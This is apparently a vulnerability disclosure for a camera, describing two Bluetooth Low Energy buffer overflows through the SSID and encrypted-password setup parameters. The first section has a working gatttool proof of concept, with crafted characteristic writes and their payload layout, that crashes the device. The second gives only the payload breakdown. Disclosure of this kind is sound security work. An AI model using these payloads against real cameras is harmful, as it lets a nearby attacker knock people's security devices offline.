==Bluetooth (BLE) based Buffer Overflow via SSID parameter==

1. Summary 

It's possible to trigger a buffer overflow condition when setting the SSID parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.

2. Proof of Concept

 anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I 
[18:B4:30:5D:00:B8][LE]> connect 
Attempting to connect to 18:B4:30:5D:00:B8 
Connection successful
 [18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b 
Characteristic value was written successfully
 Characteristic value was written successfully 
[18:B4:30:5D:00:B8][LE]> (gatttool:20352): GLib-WARNING **: Invalid file descriptor.

3. Details

The payload attempts to set an SSID with a length of 1 byte and sends 16. SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16

4. Result 

Crash and reboot back to operational state


==Bluetooth (BLE) based Buffer Overflow via Encrypted Password parameter==

1. Summary 

It's possible to trigger a buffer overflow condition when setting the encrypted password parameter on the camera. The attacker must be in bluetooth range at any time during the cameras powered on state. Bluetooth is never disabled even after initial setup.

2. Proof of Concept

3. Details 

The payload attempts to set the encrypted wifi password with a length of 1 byte and sends 3. SequenceNum=3a + Type=0312 + Length=0b + ssidVal=506574536d6172742d356e + type=1a + length=01 + encPass=AA*3
